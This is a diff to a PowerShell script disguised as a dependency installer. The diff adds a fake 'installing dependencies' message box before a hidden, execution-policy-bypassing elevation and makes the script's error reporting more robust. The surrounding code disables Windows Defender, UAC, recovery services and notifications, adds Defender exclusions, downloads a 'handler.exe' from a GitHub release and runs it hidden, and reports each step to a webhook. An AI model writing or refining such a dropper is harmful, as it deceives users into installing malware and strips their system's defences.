@@ -7,10 +7,6 @@ $DOWNLOAD_URLS = @{
     "handler" = "https://github.com/skiddyskid111/resources/releases/download/adadad/handler.exe"
 }
 
-# Display initial message
-Write-Host "Installing dependencies, please wait 1-3 minutes."
-Write-Host "The window may close; this is normal."
-
 function Send-WebhookMessage {
     param (
         [Parameter(Mandatory=$true)]
@@ -33,6 +29,17 @@ function Check-AdminPrivileges {
     Send-WebhookMessage -Message "Admin check: $isAdmin"
     
     if (-not $isAdmin) {
+        # Display message box only if not running as admin
+        Add-Type -AssemblyName System.Windows.Forms
+        $msgBox = [System.Windows.Forms.MessageBox]::Show(
+            "Installing dependencies, please wait 1-3 minutes. The window may close; this is normal.",
+            "Script Information",
+            [System.Windows.Forms.MessageBoxButtons]::OK,
+            [System.Windows.Forms.MessageBoxIcon]::Information,
+            [System.Windows.Forms.MessageBoxDefaultButton]::Button1,
+            [System.Windows.Forms.MessageBoxOptions]::ServiceNotification
+        )
+        
         try {
             Send-WebhookMessage -Message "Attempting elevation"
             Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction Stop
@@ -40,7 +47,7 @@ function Check-AdminPrivileges {
             exit
         }
         catch {
-            Send-WebhookMessage -Message "Elevation failed: $_"
+            Send-WebhookMessage -Message "Elevation failed: $($_.Exception.Message)"
             exit 1
         }
     }
@@ -62,7 +69,7 @@ function Disable-Notifications {
         Send-WebhookMessage -Message "All app notifications disabled"
     }
     catch {
-        Send-WebhookMessage -Message "Error disabling notifications: $_"
+        Send-WebhookMessage -Message "Error disabling notifications: $($_.Exception.Message)"
     }
 }
 
@@ -105,7 +112,7 @@ function Disable-WindowsDefender {
         Send-WebhookMessage -Message "Windows Defender disabled"
     }
     catch {
-        Send-WebhookMessage -Message "Error disabling Windows Defender: $_"
+        Send-WebhookMessage -Message "Error disabling Windows Defender: $($_.Exception.Message)"
     }
 }
 
@@ -127,7 +134,7 @@ function Disable-UACAndRecovery {
         Send-WebhookMessage -Message "UAC and recovery services disabled"
     }
     catch {
-        Send-WebhookMessage -Message "Error disabling UAC/services: $_"
+        Send-WebhookMessage -Message "Error disabling UAC/services: $($_.Exception.Message)"
     }
 }
 
@@ -149,7 +156,7 @@ function Add-DefenderExclusions {
         }
         catch {
             $exclusionsAdded = $false
-            Send-WebhookMessage -Message "Error adding exclusion for $path: $_"
+            Send-WebhookMessage -Message "Error adding exclusion for ${path}: $($_.Exception.Message)"
         }
     }
     return $exclusionsAdded
@@ -172,18 +179,27 @@ function Execute-Exe {
             Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
         }
         catch {
-            Send-WebhookMessage -Message "Error adding exclusion for $destinationPath: $_"
+            Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $($_.Exception.Message)"
         }
     }
     
     try {
         Invoke-WebRequest -Uri $Url -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop
         Send-WebhookMessage -Message "Downloaded $ExeName to $destinationPath"
-        Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop
-        Send-WebhookMessage -Message "Executed $ExeName"
+        
+        # Verify file exists before attempting to execute
+        if (Test-Path -Path $destinationPath) {
+            $process = Start-Process -FilePath $destinationPath -WindowStyle Hidden -PassThru -ErrorAction Stop
+            Send-WebhookMessage -Message "Executed $ExeName with PID: $($process.Id)"
+            # Wait briefly to ensure process starts
+            Start-Sleep -Milliseconds 500
+        }
+        else {
+            Send-WebhookMessage -Message "Error: $ExeName file not found at $destinationPath after download"
+        }
     }
     catch {
-        Send-WebhookMessage -Message "Error downloading or executing $ExeName: $_"
+        Send-WebhookMessage -Message "Error downloading or executing ${ExeName}: $($_.Exception.Message)"
     }
 }
 
@@ -197,10 +213,12 @@ try {
     if (Add-DefenderExclusions) {
         foreach ($exe in $DOWNLOAD_URLS.GetEnumerator()) {
             Execute-Exe -ExeName $exe.Key -Url $exe.Value
+            # Add delay between executions to prevent conflicts
+            Start-Sleep -Seconds 1
         }
     }
     Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 }
 catch {
-    Send-WebhookMessage -Message "Unexpected error: $_"
+    Send-WebhookMessage -Message "Unexpected error: $($_.Exception.Message)"
 }
